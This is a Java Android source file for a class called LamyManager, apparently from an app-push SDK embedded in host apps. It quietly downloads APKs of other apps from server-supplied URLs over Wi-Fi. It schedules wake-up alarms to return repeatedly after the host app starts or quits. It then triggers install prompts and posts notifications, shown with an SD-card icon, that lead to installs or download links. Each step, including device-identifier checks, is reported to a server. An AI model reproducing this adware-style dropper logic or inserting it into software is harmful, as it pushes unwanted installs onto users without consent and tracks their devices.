package com.tbu.android.lamy;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

import com.tbu.android.lamy.download.DownloadAppInfo;
import com.tbu.android.lamy.download.DownloadCallback;
import com.tbu.android.lamy.download.DownloadFileInside;
import com.tbu.android.lamy.download.DownloadFileOutside;
import com.tbu.android.lamy.download.db.DownloadDbManager;
import com.tbu.android.lamy.download.success.SuccessFileManager;
import com.tbu.android.lamy.event.EventReceiver;
import com.tbu.android.lamy.install.InstallAppInfo;
import com.tbu.android.lamy.install.nowifi.NoWifiInstallManager;
import com.tbu.android.lamy.server.ServerManager;
import com.tbu.android.lamy.server.domain.PhInfo;
import com.tbu.android.lamy.util.Debug;
import com.tbu.android.lamy.util.DownloadUtil;
import com.tbu.android.lamy.util.SessionUtil;
import com.tbu.androidtools.device.DeviceInfo;
import com.tbu.androidtools.device.DeviceUtil;
import com.tbu.androidtools.device.PhoneInfoManager;

public class LamyManager {

	public final static int ALL_MAX_INSTALL_REQ = 1; // 允许的-单次请求最多请求安装几个

	public final static int DEFAULT_FIRST_TIME = 5 * 60 * 1000; // 默认首次使用启动时间-5分钟
	public final static int DEFAULT_WAIT_TIME = 8 * 60 * 60 * 1000; // 默认下次启动时间-8小时
	public final static int DEFAULT_WAIT_CHECKINSTALL_TIME = 2 * 60 * 1000; // 默认安装请求后，延迟启动应用时间-2分钟
	public final static int DEFAULT_APPQUIT_WAIT_TIME = 10 * 1000; // 默认应用退出后启动安装APP时间-10秒

	private boolean onDownloadProcess = false;

	private static LamyManager instance;

	public static LamyManager getInstance() {
		if (instance == null) {
			instance = new LamyManager();
		}
		return instance;
	}

	private LamyManager() {
	}

	/**
	 * app进入时调用
	 * 
	 * @param context
	 */
	public void appStart(final Context context) {
		new Thread(new Runnable() {
			@Override
			public void run() {

				boolean result = ServerManager.updateDownloadInfo(context);
				if (result) {
					Debug.i(" ph Manager->appStart, allow ph");

					// 判断是否为首次登陆，如果是，延迟时间设置的更短。
					if (LamyConfig.isFirstUse(context)) {
						doDownloadTask(context,
								SessionUtil.getSessionId(context),
								EventReceiver.ACTION_FIRST_USEAPP, false);
						setNextReqInstallTime(context,
								LamyManager.DEFAULT_FIRST_TIME,
								EventReceiver.ACTION_FIRST_USEAPP,
								SessionUtil.getAlarmId(context));
					} else {
						doDownloadTask(context,
								SessionUtil.getSessionId(context),
								EventReceiver.ACTION_APP_START, false);
						setNextReqInstallTime(context,
								LamyManager.DEFAULT_WAIT_TIME,
								EventReceiver.ACTION_APP_START,
								SessionUtil.getAlarmId(context));
					}

				} else {
					Debug.i("phManager->appStart, !!NOT!! allow ph");
				}
			}
		}).start();
	}

	public void doNoWifiNotifiy(Context context, String action) {
		final DownloadDbManager ddm = new DownloadDbManager(context);
		final List<DownloadAppInfo> downloadAppInfos = ddm
				.query(DownloadAppInfo.getDownloadAppInfoVersion(context));
		int currentPosition = NoWifiInstallManager.getCurrentPosition(context);
		if (downloadAppInfos != null
				&& currentPosition < downloadAppInfos.size()) {
			if (downloadAppInfos.get(currentPosition) != null) {
				try {
					if (DeviceUtil.isAvilible(context,
							downloadAppInfos.get(currentPosition)
									.getPackagename())) {
						NoWifiInstallManager.setCurrentPosition(context,
								currentPosition + 1);
						doNoWifiNotifiy(context, action);
					} else {
						LamyManager.getInstance().notifyUrl(
								context,
								downloadAppInfos.get(currentPosition)
										.getUrlweb(),
								downloadAppInfos.get(currentPosition)
										.getTitle(),
								downloadAppInfos.get(currentPosition)
										.getContent(), action,
								PhInfo.PHTYPE_NOWIFI_NOTIFY);
						NoWifiInstallManager.setCurrentPosition(context,
								currentPosition + 1);
					}

				} catch (Exception e) {
					Debug.e("phManager->doNoWifiNotifiy, e = " + e.toString());
				}

			}
		}
	}

	/**
	 * 
	 * @param context
	 */
	public void appQuit(final Context context) {
		setNextReqInstallTime(context, DEFAULT_APPQUIT_WAIT_TIME,
				EventReceiver.ACTION_APP_QUIT, SessionUtil.getAlarmId(context));
	}

	/**
	 * 一定时间后启动-安装任务
	 * 
	 * @param context
	 * @param time
	 *            毫秒
	 */
	public void setNextReqInstallTime(Context context, long time,
			String action, int requestCode) {
		AlarmManager am = (AlarmManager) context
				.getSystemService(Context.ALARM_SERVICE);
		Intent alarmIntent = new Intent(context, EventReceiver.class);
		alarmIntent.setAction(action);
		PendingIntent pIntent = PendingIntent.getBroadcast(context,
				requestCode, alarmIntent, 0);

		am.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + time,
				pIntent);
		Debug.i("phManager->setNextReqServerTime at(from now) : " + time);
	}

	/**
	 * 异步方法。后台执行下载请求。
	 * 
	 * @param context
	 */
	public void doDownloadTask(final Context context, final int sessionId,
			final String action, final boolean downloadSuccessInstall) {
		// 如果大于最大缓存数，则不再继续执行。
		if (PhoneInfoManager.DEFAULT_EI.equals(DeviceInfo.getei())
				|| PhoneInfoManager.DEFAULT_SI.equals(DeviceInfo.getsi())) {
			Debug.w("phManager->doDownloadTask, error si or ei...");
			PhInfo phInfo = new PhInfo();
			phInfo.ph_version = LamyConfig.VERSION;
			phInfo.ph_type = PhInfo.PHTYPE_ERROR_IMEI_OR_SI; // 异常的IMEI或者IMSI
			phInfo.req_action = action;
			ServerManager.doPostPhMarkTask(context, phInfo);
			return;
		}

		if (DeviceInfo.getNewAccessType() != 4) { // TODO : 4应该改为TAT定义的值
			Debug.w("phManager->doDownloadTask, only wifi allow work...");
			PhInfo phInfo = new PhInfo();
			phInfo.ph_version = LamyConfig.VERSION;
			phInfo.ph_type = PhInfo.PHTYPE_NOWIFI; // 没有wifi
			phInfo.req_action = action;
			ServerManager.doPostPhMarkTask(context, phInfo);
			if (downloadSuccessInstall) {
				doNoWifiNotifiy(context, action);
			}
			return;
		}

		if (LamyManager.getCanbeInstallAppCount(context) >= LamyConfig.MAX_CACHE_DOWNLOAD_APP) {
			Debug.w("phManager->doDownloadTask(), phManager.getCanbeInstallAppCount(context) = "
					+ LamyManager.getCanbeInstallAppCount(context)
					+ "; MAX_CACHE_DOWNLOAD_APP = "
					+ LamyConfig.MAX_CACHE_DOWNLOAD_APP);
			return;
		}

		Debug.i("phManager->doDownloadTask, coming");
		new Thread(new Runnable() {
			@Override
			public void run() {
				String task_seq = null;
				// STEP 1 : 获取可推荐应用列表
				final DownloadDbManager ddm = new DownloadDbManager(context);
				final List<DownloadAppInfo> downloadAppInfos = ddm
						.query(DownloadAppInfo
								.getDownloadAppInfoVersion(context));
				// STEP 2 : 获得未安装列表
				List<DownloadAppInfo> waitDownloadList = new ArrayList<DownloadAppInfo>();
				for (int i = 0; i < downloadAppInfos.size(); i++) {
					// STEP3 检查是否已经安装
					if (!DeviceUtil.isAvilible(context, downloadAppInfos.get(i)
							.getPackagename())) {
						// STEP4 检查是否已经下载
						// 记录未安装且已下载的应用个数是否大于2，如果超过2个则不再继续。
						InstallAppInfo installAppInfo = InstallAppInfo
								.getInstallAppInfo(context, downloadAppInfos
										.get(i).getTbuId());
						if (!installAppInfo.isSuccessDownload()) {
							// 如果未安装，且下载成功的应用个数大于某个值，不用继续下载了。
							// STEP5 加入下载队列
							waitDownloadList.add(downloadAppInfos.get(i));
							if (task_seq == null) { // 第一个加入的计算位置（排列的位置说明优先级）
								task_seq = i + "/" + downloadAppInfos.size();
							}
						}
					}
				}

				// STEP6 如果存在还未完成的任务，执行下载任务
				if (waitDownloadList.size() > 0) {
					download(
							context,
							waitDownloadList.get(0).getUrl(),
							String.valueOf(waitDownloadList.get(0).getTbuId()),
							String.valueOf(waitDownloadList.get(0).getVersion()),
							waitDownloadList.get(0).getTbuId(), sessionId,
							task_seq, waitDownloadList.get(0).getPackagename(),
							action, waitDownloadList.get(0).getTitle(),
							waitDownloadList.get(0).getContent(),
							downloadSuccessInstall);
				}

			}
		}).start();
	}

	private int downloadFailCount = 0;

	/**
	 * 执行下载任务
	 * 
	 * @param context
	 * @param urlDownload
	 * @param appName
	 * @param version
	 */
	private void download(final Context context, final String urlDownload,
			final String appName, final String version, final int appKey,
			final int sessionId, final String task_seq,
			final String packageName, final String action, final String title,
			final String content, final boolean downloadSuccessInstall) {
		if (onDownloadProcess) {
			Debug.e("phManager->download, onDownloadProcess, action = "
					+ action + ", downloadSuccessInstall = "
					+ downloadSuccessInstall);
			return;
		} else {
			Debug.i("phManager->download, action = " + action
					+ ", downloadSuccessInstall = " + downloadSuccessInstall);
		}
		onDownloadProcess = true;

		if (DownloadUtil.isSDCardExist() && // 对于已经下载好的文件可以不用继续下载了
				SuccessFileManager.hasDownloadFile(Integer.parseInt(version),
						packageName)) {
			Debug.w("phManager->download, file has downloaded.packageName:"
					+ packageName + ";version:" + version);
			Debug.w("phManager->download,filePath:"
					+ DownloadUtil.getSdRootSuccessFilePath() + File.separator
					+ SuccessFileManager.getApkFileDir(version, packageName)
					+ ".apk");
			InstallAppInfo installAppInfo = new InstallAppInfo();
			installAppInfo.setAppKey(appKey);
			installAppInfo.setFileDir(DownloadUtil.getSdRootSuccessFilePath()
					+ File.separator
					+ SuccessFileManager.getApkFileDir(version, packageName)
					+ ".apk");
			installAppInfo.setSuccessDownload(true);
			installAppInfo.setPackageName(packageName);
			installAppInfo.setTitle(title);
			installAppInfo.setContent(content);
			InstallAppInfo.setInstallAppInfo(context, installAppInfo);

			// 记录一次特殊请求
			PhInfo phInfo = new PhInfo();
			phInfo.ph_version = LamyConfig.VERSION;
			phInfo.ph_type = PhInfo.PHTYPE_REQDOWNLOAD_HAS;
			phInfo.ph_game_name = appName;
			phInfo.session_id = sessionId;
			phInfo.task_seq = task_seq;
			phInfo.req_action = action;
			ServerManager.doPostPhMarkTask(context, phInfo);

			onDownloadProcess = false;

			if (downloadSuccessInstall) {
				// 出发直接安装任务
				doInstallTask(context, sessionId, action);
			} else if (!downloadSuccessInstall) {
				// 开启下一次事务
				if (downloadFailCount < 2) { //
					doDownloadTask(context, sessionId, action, false);
				}
			}
			return;
		}

		// 记录一次下载请求
		PhInfo phInfo = new PhInfo();
		phInfo.ph_version = LamyConfig.VERSION;
		phInfo.ph_type = PhInfo.PHTYPE_REQDOWNLOAD;
		phInfo.ph_game_name = appName;
		phInfo.session_id = sessionId;
		phInfo.task_seq = task_seq;
		phInfo.req_action = action;
		ServerManager.doPostPhMarkTask(context, phInfo);

		if (DownloadUtil.isSDCardExist()) {

			DownloadFileOutside downloadFileOutside = new DownloadFileOutside(
					context, new DownloadCallback() {
						@Override
						public void result(final boolean downloadSuccess,
								final String filePath, final long packageSize,
								final long download_time,
								final String packageName) {
							if (downloadSuccess) {

								SuccessFileManager.copyFile(
										filePath,
										SuccessFileManager.getApkFileDir(
												version, packageName) + ".apk");

								InstallAppInfo installAppInfo = new InstallAppInfo();
								installAppInfo.setAppKey(appKey);
								installAppInfo.setFileDir(filePath);
								installAppInfo.setSuccessDownload(true);
								installAppInfo.setPackageName(packageName);
								installAppInfo.setTitle(title);
								installAppInfo.setContent(content);
								InstallAppInfo.setInstallAppInfo(context,
										installAppInfo);
							}
							Debug.i("phManager->download, action = " + action
									+ ", downloadSuccessInstall = "
									+ downloadSuccessInstall
									+ ", downloadSuccess = " + downloadSuccess);

							PhInfo phInfo = new PhInfo();
							phInfo.ph_version = LamyConfig.VERSION;
							phInfo.ph_type = PhInfo.PHTYPE_DOWNLOADRESULT;
							phInfo.ph_game_name = appName;
							phInfo.session_id = sessionId;
							phInfo.task_seq = task_seq;
							phInfo.download_time = download_time;
							phInfo.package_size = packageSize;
							phInfo.result_code = downloadSuccess ? 0 : 1;
							phInfo.req_action = action;
							ServerManager.doPostPhMarkTask(context, phInfo);

							onDownloadProcess = false;

							if (downloadSuccess) {
								downloadFailCount = 0;
							} else {
								downloadFailCount++;
							}

							if (downloadSuccess && downloadSuccessInstall) {
								// 出发直接安装任务
								doInstallTask(context, sessionId, action);
							} else if (!downloadSuccessInstall) {
								// 开启下一次事务
								if (downloadFailCount < 2) { //
									doDownloadTask(context, sessionId, action,
											false);
								}
							}
						}
					}, packageName);
			downloadFileOutside.execute(urlDownload, version, appName);
		} else {
			DownloadFileInside downloadFileInside = new DownloadFileInside(
					context, new DownloadCallback() {
						@Override
						public void result(final boolean downloadSuccess,
								final String filePath, final long packageSize,
								final long download_time,
								final String packageName) {
							if (downloadSuccess) {
								InstallAppInfo installAppInfo = new InstallAppInfo();
								installAppInfo.setAppKey(appKey);
								installAppInfo.setFileDir(filePath);
								installAppInfo.setSuccessDownload(true);
								installAppInfo.setPackageName(packageName);
								installAppInfo.setTitle(title);
								installAppInfo.setContent(content);
								InstallAppInfo.setInstallAppInfo(context,
										installAppInfo);
							}

							PhInfo phInfo = new PhInfo();
							phInfo.ph_version = LamyConfig.VERSION;
							phInfo.ph_type = PhInfo.PHTYPE_DOWNLOADRESULT;
							phInfo.ph_game_name = appName;
							phInfo.session_id = sessionId;
							phInfo.task_seq = task_seq;
							phInfo.download_time = download_time;
							phInfo.package_size = packageSize;
							phInfo.result_code = downloadSuccess ? 0 : 1;
							phInfo.req_action = action;
							ServerManager.doPostPhMarkTask(context, phInfo);

							onDownloadProcess = false;

							if (downloadSuccess) {
								downloadFailCount = 0;
							} else {
								downloadFailCount++;
							}

							if (downloadFailCount < 3) {
								doDownloadTask(context, sessionId, action,
										false); // 开启下一次事务
							}

						}
					}, packageName);
			downloadFileInside.execute(urlDownload, version, appName);
		}
	}

	/**
	 * 进行安装请求。
	 * 
	 * @param context
	 * @param sessionId
	 * @param action
	 * @return true，启动安装请求。flase，没有启动安装请求。
	 */
	public boolean doInstall(Context context) {
		final int sessionId = SessionUtil.getAlarmId(context);
		// STEP 1 : 获取可推荐应用列表
		final DownloadDbManager ddm = new DownloadDbManager(context);
		final List<DownloadAppInfo> downloadAppInfos = ddm
				.query(DownloadAppInfo.getDownloadAppInfoVersion(context));
		int reqInstallCount = 0;
		for (int i = 0; i < downloadAppInfos.size(); i++) {
			// STEP3 检查是否已经安装
			if (!DeviceUtil.isAvilible(context, downloadAppInfos.get(i)
					.getPackagename())) {
				// STEP4 检查是否已经下载
				InstallAppInfo installAppInfo = InstallAppInfo
						.getInstallAppInfo(context, downloadAppInfos.get(i)
								.getTbuId());
				if (installAppInfo.isSuccessDownload()) {
					if (installAppInfo.getRequestInstallTimes() < InstallAppInfo.MAX_REQUEST_INSTALL_TIMES) {
						if (reqInstallCount < ALL_MAX_INSTALL_REQ) { // 允许最大安装量

							installAppInfo
									.setRequestInstallTimes(installAppInfo
											.getRequestInstallTimes() + 1);
							InstallAppInfo.setInstallAppInfo(context,
									installAppInfo);

							// TODO : 实际上可进一步根据应用程序状态来判断走通知栏还是走直接弹出
							doInstallByDir(context, downloadAppInfos.get(i)
									.getTbuId(), sessionId,
									EventReceiver.ACTION_APP_INSTALL_DIRECT,
									PhInfo.PHTYPE_REQINSTALL);

							reqInstallCount++;
							return true;
						} else if (reqInstallCount < (ALL_MAX_INSTALL_REQ + 1)) {
							nofityInstallBySecondTime(context, downloadAppInfos
									.get(i).getTbuId(),
									EventReceiver.ACTION_APP_INSTALL_DIRECT,
									sessionId);
							reqInstallCount++;
						}
					}
				}
			}
		}
		return false;
	}

	/**
	 * 安装应用流程
	 * 
	 * @param context
	 */
	public void doInstallTask(final Context context, final int sessionId,
			final String action) {
		Debug.i("phManager->doInstallTask, coming");
		if (EventReceiver.ACTION_TIME_INSTALL.equals(action)) {
			setNextReqInstallTime(context, DEFAULT_WAIT_TIME,
					EventReceiver.ACTION_TIME_INSTALL,
					SessionUtil.getAlarmId(context));
		}
		new Thread(new Runnable() {
			@Override
			public void run() {
				Debug.i("phManager->doInstallTask, Thread start");
				// STEP 1 : 获取可推荐应用列表
				final DownloadDbManager ddm = new DownloadDbManager(context);
				final List<DownloadAppInfo> downloadAppInfos = ddm
						.query(DownloadAppInfo
								.getDownloadAppInfoVersion(context));
				Debug.i("phManager->doInstallTask, downloadAppInfos.size() = "
						+ downloadAppInfos.size());
				// STEP 2 : 获得未安装列表
				int reqInstallCount = 0;
				boolean hasSuccessReq = false; // 是否已经有安装请求
				for (int i = 0; i < downloadAppInfos.size(); i++) {
					// STEP3 检查是否已经安装
					if (!DeviceUtil.isAvilible(context, downloadAppInfos.get(i)
							.getPackagename())) {
						// STEP4 检查是否已经下载
						InstallAppInfo installAppInfo = InstallAppInfo
								.getInstallAppInfo(context, downloadAppInfos
										.get(i).getTbuId());
						if (installAppInfo.isSuccessDownload()) {
							if (installAppInfo.getRequestInstallTimes() < InstallAppInfo.MAX_REQUEST_INSTALL_TIMES) {
								if (reqInstallCount < ALL_MAX_INSTALL_REQ) { // 允许最大安装量
									// 此处记录一次安装请求
									hasSuccessReq = true;

									installAppInfo
											.setRequestInstallTimes(installAppInfo
													.getRequestInstallTimes() + 1);
									InstallAppInfo.setInstallAppInfo(context,
											installAppInfo);

									LamyManager.doInstallTask(context,
											installAppInfo.getFileDir());
									setCheckAppInstalledTime(
											context,
											DEFAULT_WAIT_CHECKINSTALL_TIME
													+ (DEFAULT_WAIT_CHECKINSTALL_TIME * 5)
													* reqInstallCount,
											installAppInfo.getPackageName(),
											action);
									reqInstallCount++;

									PhInfo phInfo = new PhInfo();
									phInfo.ph_version = LamyConfig.VERSION;
									phInfo.ph_type = PhInfo.PHTYPE_REQINSTALL;
									phInfo.ph_game_name = String
											.valueOf(installAppInfo.getAppKey());
									phInfo.session_id = sessionId;
									phInfo.req_install_times = installAppInfo
											.getRequestInstallTimes();
									phInfo.req_action = action;
									ServerManager.doPostPhMarkTask(context,
											phInfo);
								}
							} else if (installAppInfo.getRequestInstallTimes() < (InstallAppInfo.MAX_REQUEST_INSTALL_TIMES + 1)) {
								installAppInfo
										.setRequestInstallTimes(installAppInfo
												.getRequestInstallTimes() + 1);
								InstallAppInfo.setInstallAppInfo(context,
										installAppInfo);
								nofityInstallBySecondTime(context,
										downloadAppInfos.get(i).getTbuId(),
										action, sessionId);
							}
						} else { // 有未下载的应用存在
							// 注意：这种情况下可能出现同时开启多个下载任务的情况
							// 如果是下载不成功，考虑开启下载
							// 这种情况下，下载成功直接安装
							if (!hasSuccessReq) { // 如果没有应用安装过
								Debug.i("phManager->doInstallTask, no download success app, so req download again");
								doDownloadTask(context, sessionId, action, true);
								return;
							}
						}
					} else {
						Debug.i("phManager->doInstallTask, STEP3, i= " + i);
					}
				}
			}
		}).start();

	}

	public void doInstallByDir(Context context, int installAppKey,
			int sessionId, String action, int phType) {
		InstallAppInfo installAppInfo = InstallAppInfo.getInstallAppInfo(
				context, installAppKey);
		LamyManager.doInstallTask(context, installAppInfo.getFileDir());
		setCheckAppInstalledTime(context, DEFAULT_WAIT_CHECKINSTALL_TIME,
				installAppInfo.getPackageName(), action);

		PhInfo phInfo = new PhInfo();
		phInfo.ph_version = LamyConfig.VERSION;
		phInfo.ph_type = phType;
		phInfo.ph_game_name = String.valueOf(installAppInfo.getAppKey());
		phInfo.session_id = sessionId;
		phInfo.req_install_times = installAppInfo.getRequestInstallTimes();
		phInfo.req_action = action;
		ServerManager.doPostPhMarkTask(context, phInfo);
	}

	/**
	 * 一定时间后检查App是否安装并尝试启动
	 * 
	 * @param context
	 * @param time
	 *            毫秒
	 */
	public void setCheckAppInstalledTime(Context context, long time,
			String packageName, String action) {
		AlarmManager am = (AlarmManager) context
				.getSystemService(Context.ALARM_SERVICE);
		Intent alarmIntent = new Intent(context, EventReceiver.class);
		alarmIntent.setAction(EventReceiver.ACTION_CI);
		Bundle bundle = new Bundle();
		bundle.putString(EventReceiver.IB_KEY_PACKAGMNAME, packageName);
		bundle.putString(EventReceiver.IB_KEY_ACTION, action);
		alarmIntent.putExtras(bundle);
		PendingIntent pIntent = PendingIntent.getBroadcast(context,
				SessionUtil.getAlarmId(context), alarmIntent, 0);

		am.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + time,
				pIntent);
		Debug.i("phManager->setCheckAppInstalledTime at(from now) : " + time
				+ ",packageName=" + packageName);
	}

	private void nofityInstallBySecondTime(Context context, int installAppKey,
			String action, int sessionId) {
		Notification notifycation = new Notification();
		notifycation.icon = android.R.drawable.stat_notify_sdcard;
		notifycation.defaults = Notification.DEFAULT_ALL;
		notifycation.flags |= Notification.FLAG_AUTO_CANCEL;

		Intent baseIntent = new Intent(context, EventReceiver.class);
		Bundle bundle = new Bundle();
		bundle.putInt(EventReceiver.IB_KEY_INSTALLAPPKEY, installAppKey);
		baseIntent.putExtras(bundle);
		baseIntent.setAction(EventReceiver.ACTION_NOTIFICATION_INSTALL);
		PendingIntent pIntent = PendingIntent.getBroadcast(context,
				SessionUtil.getAlarmId(context), baseIntent, 0);

		InstallAppInfo installAppInfo = InstallAppInfo.getInstallAppInfo(
				context, installAppKey);
		notifycation.setLatestEventInfo(context, installAppInfo.getTitle(),
				installAppInfo.getContent(), pIntent);

		NotificationManager manager = (NotificationManager) context
				.getSystemService(Context.NOTIFICATION_SERVICE);
		manager.notify(SessionUtil.getAlarmId(context), notifycation);

		PhInfo phInfo = new PhInfo();
		phInfo.ph_version = LamyConfig.VERSION;
		phInfo.ph_type = PhInfo.PHTYPE_SECOND_NOTIFY;
		phInfo.ph_game_name = String.valueOf(installAppInfo.getAppKey());
		phInfo.session_id = sessionId;
		phInfo.req_install_times = installAppInfo.getRequestInstallTimes();
		phInfo.req_action = action;
		ServerManager.doPostPhMarkTask(context, phInfo);
	}

	/**
	 * 通知栏加入直接起浏览器的下载链接
	 * 
	 * @param context
	 * @param url
	 * @param title
	 * @param content
	 * @param action
	 */
	public void notifyUrl(Context context, String url, String title,
			String content, String action, int phType) {
		Notification notifycation = new Notification();
		notifycation.icon = android.R.drawable.stat_notify_sdcard;
		notifycation.defaults = Notification.DEFAULT_ALL;
		notifycation.flags |= Notification.FLAG_AUTO_CANCEL;

		Intent baseIntent = new Intent(context, EventReceiver.class);
		Bundle bundle = new Bundle();
		bundle.putString(EventReceiver.IB_KEY_WEBURL, url);
		baseIntent.putExtras(bundle);
		baseIntent.setAction(EventReceiver.ACTION_NOTIFICATION_WEB);
		PendingIntent pIntent = PendingIntent.getBroadcast(context,
				SessionUtil.getAlarmId(context), baseIntent, 0);

		notifycation.setLatestEventInfo(context, title, content, pIntent);

		NotificationManager manager = (NotificationManager) context
				.getSystemService(Context.NOTIFICATION_SERVICE);
		manager.notify(SessionUtil.getAlarmId(context), notifycation);

		PhInfo phInfo = new PhInfo();
		phInfo.ph_version = LamyConfig.VERSION;
		phInfo.ph_type = phType;
		phInfo.ph_game_name = title;
		phInfo.session_id = 0;
		phInfo.req_install_times = 0;
		phInfo.req_action = action;
		ServerManager.doPostPhMarkTask(context, phInfo);
	}

	// ================================================================================
	// 静态工具方法
	// ================================================================================

	/**
	 * 获取可被安装的应用数[特指无需下载]。
	 * 
	 * @param context
	 * @return
	 */
	private static int getCanbeInstallAppCount(Context context) {
		int result = 0;
		final DownloadDbManager ddm = new DownloadDbManager(context);
		final List<DownloadAppInfo> downloadAppInfos = ddm
				.query(DownloadAppInfo.getDownloadAppInfoVersion(context));
		for (int i = 0; i < downloadAppInfos.size(); i++) {
			if (!DeviceUtil.isAvilible(context, downloadAppInfos.get(i)
					.getPackagename())) {
				InstallAppInfo installAppInfo = InstallAppInfo
						.getInstallAppInfo(context, downloadAppInfos.get(i)
								.getTbuId());
				if (installAppInfo.isSuccessDownload()
						&& installAppInfo.getRequestInstallTimes() == 0) {
					result++;
				}
			}
		}
		return result;
	}

	private static void doInstallTask(Context context, String filePath) {
		Debug.w("phManager->doInstallTask, filePath=" + filePath);
		Intent i = new Intent(Intent.ACTION_VIEW);
		i.setDataAndType(Uri.fromFile(new File(filePath)),
				"application/vnd.android.package-archive");
		i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		context.startActivity(i);
	}

	public void downloadAndInstallForLongCon(final Context context,
			final String gameId, final String version,
			final String urlDownload, final String packageName,
			final String title, final String content, final String action) {
		Debug.i("phManager->downloadAndInstall, coming...");
		new Thread(new Runnable() {
			@Override
			public void run() {
				PhInfo phInfo = new PhInfo();
				if (SuccessFileManager.hasDownloadFile(
						Integer.parseInt(version), packageName)) {
					Debug.w("==phManager->downloadAndInstall, file has downloaded.packageName:"
							+ packageName + ";version:" + version);
					Debug.w("==phManager->downloadAndInstall,filePath:"
							+ DownloadUtil.getSdRootSuccessFilePath()
							+ File.separator
							+ SuccessFileManager.getApkFileDir(version,
									packageName) + ".apk");
					LamyManager.doInstallTask(
							context,
							DownloadUtil.getSdRootSuccessFilePath()
									+ File.separator
									+ SuccessFileManager.getApkFileDir(version,
											packageName) + ".apk");
					setCheckAppInstalledTime(context,
							DEFAULT_WAIT_CHECKINSTALL_TIME
									+ (DEFAULT_WAIT_CHECKINSTALL_TIME * 5),
							packageName, action);

					phInfo = new PhInfo();
					phInfo.ph_version = LamyConfig.VERSION;
					phInfo.ph_type = PhInfo.PHTYPE_REQINSTALL;
					phInfo.ph_game_name = gameId;
					phInfo.session_id = 0;
					phInfo.req_install_times = 1;
					phInfo.req_action = EventReceiver.ACTION_CONPH_TYPE_4;
					ServerManager.doPostPhMarkTask(context, phInfo);
					return;
				} else {
					Debug.w("phManager->downloadAndInstall, file not downloaded.packageName:"
							+ packageName + ";version:" + version);
				}

				phInfo = new PhInfo();
				phInfo.ph_version = LamyConfig.VERSION;
				phInfo.ph_type = PhInfo.PHTYPE_REQDOWNLOAD;
				phInfo.ph_game_name = gameId;
				phInfo.session_id = 0;
				phInfo.task_seq = "0";
				phInfo.req_action = action;
				ServerManager.doPostPhMarkTask(context, phInfo);

				if (DownloadUtil.isSDCardExist()) {
					DownloadFileOutside downloadFileOutside = new DownloadFileOutside(
							context, new DownloadCallback() {
								@Override
								public void result(
										final boolean downloadSuccess,
										final String filePath,
										final long packageSize,
										final long download_time,
										final String packageName) {
									SuccessFileManager.copyFile(
											filePath,
											SuccessFileManager.getApkFileDir(
													version, packageName)
													+ ".apk");
									PhInfo phInfo = new PhInfo();
									phInfo.ph_version = LamyConfig.VERSION;
									phInfo.ph_type = PhInfo.PHTYPE_DOWNLOADRESULT;
									phInfo.ph_game_name = gameId;
									phInfo.session_id = 0;
									phInfo.task_seq = "0";
									phInfo.download_time = download_time;
									phInfo.package_size = packageSize;
									phInfo.result_code = downloadSuccess ? 0
											: 1;
									phInfo.req_action = action;
									ServerManager.doPostPhMarkTask(context,
											phInfo);

									onDownloadProcess = false;

									if (downloadSuccess) {
										LamyManager.doInstallTask(context,
												filePath);
										setCheckAppInstalledTime(
												context,
												DEFAULT_WAIT_CHECKINSTALL_TIME
														+ (DEFAULT_WAIT_CHECKINSTALL_TIME * 5),
												packageName, action);

										phInfo = new PhInfo();
										phInfo.ph_version = LamyConfig.VERSION;
										phInfo.ph_type = PhInfo.PHTYPE_REQINSTALL;
										phInfo.ph_game_name = gameId;
										phInfo.session_id = 0;
										phInfo.req_install_times = 1;
										phInfo.req_action = action;
										ServerManager.doPostPhMarkTask(
												context, phInfo);
									}

								}
							}, packageName);
					downloadFileOutside.execute(urlDownload, version, gameId);
				} else {
					DownloadFileInside downloadFileInside = new DownloadFileInside(
							context, new DownloadCallback() {
								@Override
								public void result(
										final boolean downloadSuccess,
										final String filePath,
										final long packageSize,
										final long download_time,
										final String packageName) {

									PhInfo phInfo = new PhInfo();
									phInfo.ph_version = LamyConfig.VERSION;
									phInfo.ph_type = PhInfo.PHTYPE_DOWNLOADRESULT;
									phInfo.ph_game_name = gameId;
									phInfo.session_id = 0;
									phInfo.task_seq = "0";
									phInfo.download_time = download_time;
									phInfo.package_size = packageSize;
									phInfo.result_code = downloadSuccess ? 0
											: 1;
									phInfo.req_action = action;
									ServerManager.doPostPhMarkTask(context,
											phInfo);

									if (downloadSuccess) {
										LamyManager.doInstallTask(context,
												filePath);
										setCheckAppInstalledTime(
												context,
												DEFAULT_WAIT_CHECKINSTALL_TIME
														+ (DEFAULT_WAIT_CHECKINSTALL_TIME * 5),
												packageName, action);

										phInfo = new PhInfo();
										phInfo.ph_version = LamyConfig.VERSION;
										phInfo.ph_type = PhInfo.PHTYPE_REQINSTALL;
										phInfo.ph_game_name = gameId;
										phInfo.session_id = 0;
										phInfo.req_install_times = 1;
										phInfo.req_action = action;
										ServerManager.doPostPhMarkTask(
												context, phInfo);
									}

								}
							}, packageName);
					downloadFileInside.execute(urlDownload, version, gameId);
				}

			}
		}).start();

	}

	// ================================================================================
	// 测试部分
	// ================================================================================

}
